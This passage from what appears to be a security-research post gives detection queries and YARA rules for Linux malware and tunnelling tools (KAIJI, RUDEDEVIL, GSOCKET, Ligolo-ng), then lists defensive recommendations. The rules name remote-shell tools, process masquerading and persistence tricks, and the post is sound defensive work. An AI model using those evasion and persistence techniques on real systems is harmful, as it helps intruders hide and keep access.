\"*GS_WEBHOOK_KEY=*\"\n)\n```\n\n**Potential Process Masquerading via Exec**\n\nGSOCKET leverages the `exec -a` method to run a process under a different name. GSOCKET specifically leverages masquerades as kernel processes, but other malware may masquerade differently. \n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and process.args == \"-c\" and process.command_line : \"* exec -a *\"\n```\n\n**Renice or Ulimit Execution**\n\nSeveral malwares, including KAIJI and RUDEDEVIL, leverage the renice utility to change the priority of processes or set resource limits for processes. This is commonly used by miner malware to increase the priority of mining processes to maximize the mining performance.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and (\n  process.name in (\"ulimit\", \"renice\") or (\n  process.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and process.args == \"-c\" and\n  process.command_line : (\"*ulimit*\", \"*renice*\")\n  )\n)\n```\n\n**Inexistent Cron(d) Service Started**\n\nBoth KAIJI and RUDEDEVIL establish persistence through the creation of a `cron(d)` service in `/etc/init.d/cron(d)`. `Cron`, by default, does not use a `SysV Init` service. Execution of a `cron(d)` service is suspicious, and should be analyzed further.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and \n  process.name == \"systemctl\" and process.args == \"start\" and process.args in \n  (\"cron.service\", \"crond.service\", \"cron\", \"crond\")\n```\n\n**Suspicious /etc/ Process Execution from KAIJI**\n\nThe `/etc/` directory is not a commonly used directory for process executions. KAIJI is known to place a binary called `32678` and `id.services.conf` in the `/etc/` directory, to establish persistence and evade detection.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and (process.executable regex \"\"\"/etc/[0-9].*\"\"\" or process.executable : (\"/etc/*.conf\", \"/etc/.*\"))\n```\n\n**Hidden File Creation in /dev/ directory**\n\nCreating hidden files in `/dev/` and `/dev/shm/` are not inherently malicious, however, this activity should be uncommon. KAIJI, GSOCKET and other malwares such as `K4SPREADER` are known to drop hidden files in these locations.\n\n```\nfile where event.type == \"creation\" and file.path : (\"/dev/shm/.*\", \"/dev/.*\")\n```\n\n**Suspicious Process Execution from Parent Executable in /boot/**\n\nMalwares such as KAIJI and XORDDOS are known to place executable files in the `/boot/` directory, and leverage these to establish persistence while attempting to evade detection.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and process.parent.executable : \"/boot/*\"\n```\n\n#### YARA\n\nElastic Security has created YARA rules to identify this activity. Below is the YARA rule to identify the custom `Apache2` malware:\n\n```\nrule Linux_Trojan_Generic {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-20\"\n        os = \"Linux\"\n        arch = \"x86\"\n        threat_name = \"Linux.Trojan.Generic\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $enc1 = { 74 73 0A 1C 1A 54 1A 11 54 0C 18 43 59 5B 3A 11 0B 16 14 10 0C 14 5B }\n        $enc2 = { 18 1A 1A 1C 09 0D 43 59 0D 1C 01 0D 56 11 0D 14 15 55 18 09 09 15 10 }\n        $enc3 = { 18 1A 1A 1C 09 0D 54 15 18 17 1E 0C 18 1E 1C 43 59 0B 0C }\n        $enc4 = { 34 16 03 10 15 15 18 56 4C 57 49 59 51 2E 10 17 1D 16 0E 0A 59 37 }\n        $key = \"yyyyyyyy\"\n    condition:\n        1 of ($enc*) and $key\n}\n```\n\nTo detect GSOCKET, including several of its adjacent tools, we created the following signature:\n\n```\nrule Multi_Hacktool_Gsocket {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-23\"\n        os = \"Linux, MacOS\"\n        arch = \"x86\"\n        threat_name = \"Multi.Hacktool.Gsocket\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $str1 = \"gsocket: gs_funcs not found\"\n        $str2 = \"/share/gsocket/gs_funcs\"\n        $str3 = \"$GSOCKET_ARGS\"\n        $str4 = \"GSOCKET_SECRET\"\n        $str5 = \"GS_HIJACK_PORTS\"\n        $str6 = \"sftp -D gs-netcat\"\n        $str7 = \"GS_NETCAT_BIN\"\n        $str8 = \"GSOCKET_NO_GREETINGS\"\n        $str9 = \"GS-NETCAT(1)\"\n        $str10 = \"GSOCKET_SOCKS_IP\"\n        $str11 = \"GSOCKET_SOCKS_PORT\"\n        $str12 = \"gsocket(1)\"\n        $str13 = \"gs-sftp(1)\"\n        $str14 = \"gs-mount(1)\"\n    condition:\n        3 of them\n}\n```\n\nFinally, the following signature was written to detect the [open source Ligolo-ng tool](https://github.com/nicocha30/ligolo-ng), as we have reason to believe this tool was used during this intrusion.\n\n\n```\nrule Linux_Hacktool_LigoloNG {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-20\"\n        os = \"Linux\"\n        arch = \"x86\"\n        threat_name = \"Linux.Hacktool.LigoloNG\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $a = \"https://github.com/nicocha30/ligolo-ng\"\n        $b = \"@Nicocha30!\"\n        $c = \"Ligolo-ng %s / %s / %s\"\n    condition:\n        all of them\n}\n```\n\n### Defensive recommendations\n\nTo effectively defend against malware campaigns and minimize the risk of intrusion, it’s crucial to implement a multi-layered approach to security. Here are some key defensive measures you should prioritize:\n\n1. **Keep Your Elastic Detection Rules Updated and Enabled**: Ensure that your security tools, including any pre-built detection rules, are up to date. Continuous updates allow your systems to detect the latest malware signatures and behaviors.\n2. **Enable Prevention Mode in Elastic Defend**: Configure Elastic Defend in prevention mode to automatically block known threats rather than just alerting on them. Prevention mode ensures proactive defense against malware and exploits.\n3. **Monitor Alerts and Logs**: Regularly monitor alerts, logs, and servers for any signs of suspicious activity. Early detection of unusual behavior can help prevent a small breach from escalating into a full-blown compromise.\n4. **Conduct Threat Hunting**: Proactively investigate your environment for hidden threats that may have evaded detection. Threat hunting can uncover advanced attacks and persistent malware that bypass traditional security measures.\n5. **Implement Web Application Firewalls (WAFs)**: Use a WAF to block unauthorized or malicious traffic. A properly configured firewall can prevent many common web attacks.\n6. **Enforce Strong Authentication for SSH**: Use public/private key authentication for SSH access to protect against brute force attacks.\n7. **Write Secure Code**: Ensure that all custom software, especially web server technology, follows secure coding practices. Engaging professional security auditors to review your code can help identify and mitigate vulnerabilities before they are exploited.\n8. **Regularly Patch and Update Systems**: Keeping servers, applications, and software up to date is essential to defending against known vulnerabilities. Prompt patching minimizes the risk of being targeted by off-the-shelf exploits.\n\nBy following these recommendations, you can significantly reduce the attack surface and strengthen your defense against ongoing or potential malware threats.\n\n## Observations\n\nThe following observables were discussed in this research.
